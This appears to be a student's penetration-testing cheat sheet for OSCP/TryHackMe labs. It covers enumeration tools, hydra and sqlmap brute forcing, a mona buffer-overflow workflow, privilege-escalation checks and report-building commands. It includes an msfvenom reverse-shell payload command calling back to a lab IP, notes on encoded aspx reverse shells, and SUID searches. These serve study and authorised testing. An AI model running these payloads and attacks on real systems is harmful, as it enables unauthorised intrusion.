# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)

## Automatic web enum
- dirb | dirsearch
- linpeas
- wpsscan -U user -P password

## Basic network
- nmap (all ports)
  - script: locate -r nse$ | grep NAME
  - sudo nmap -p- -Pn -sS TARGET -oA AllPort
  - sudo nmap -p -Pn -A10.10.43.161 -oA Services

- nmap Scrips
  - locate -r nse$ | grep mysql = nmap script

## Pictures
- strings
- exiftool

## Login
- brute force: hydra
- sqlmap

# Buffer overflow
- Upload file on Immunity Debugger (windows)
  
```
!mona config -set workingfolder c:\Users\admin\Desktop\patota
python -c 'print"A" * TOTAL'
!mona findmsp -distance TOTAL 
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL
!mona findmsp -distance TOTAL
```

- EIP offset
- Remove "A" from script + write BBB on "retn"

```
while bad_chars
  !mona bytearray -b "\x00" = remove bad chars
  strings.py = without bad chars
  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address

!mona jmp -r esp -cpb "Badchars"
```

- Copy address and write it backwards
- Add padding: "\x90" * 16
- Shell code msfvenom without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
```
## Convert python
dos2unix file

## Linux
- sudo -l
- find / -perm -u=s -type f 2>/dev/null
- find / -type f -perm -04000 -ls 2>/dev/null : SUID
- psexec.py
- LinEnum.sh + LinPeas
- lscpu
- lsblk -a
- lsusb -v
- lspci -t -v
- fidlist -l
- Groups: LXD????
  
- Shell stabilize
  -  python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - export TERM=xterm


## Payloads
- msfvenom - reverse -f aspx -o app.aspx
- -e x86/shikata_ga_nai
- windows/shell_reverse_tcp 

## Windows
- /priv
- systeminfo
- smb read/write
  - --script=smb-enum-shares.nse,smb-enum-users.nse
- mount:
  - --script=nfs-ls,nfs-statfs,nfs-showmount
- browser cache
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%
- Unquoted services:
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
- Permissions:
  - icalcs
- eventvwr

### Kerberos
- Enumerate
  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name


```
docker exec 7b4294cce723 pandoc FOLDER/OSCP_Report_REPORT_THM.md \
-o OSCP_Report_REPORT_THM.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style pygments \
--resource-path=.:src


docker exec 7b4294cce723 pandoc OSCP_Report_Steel_Mountail_THM.md \
-o OSCP_Report_REPORT_THM.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style pygments \
--resource-path=.:src


- Docker remove all images
  - docker rmi $(docker images --filter "dangling=true" -q --no-trunc)
  - docker rmi $(docker images -q) -f
  - docker rm $(docker ps -a -q)
  - docker system prune
```

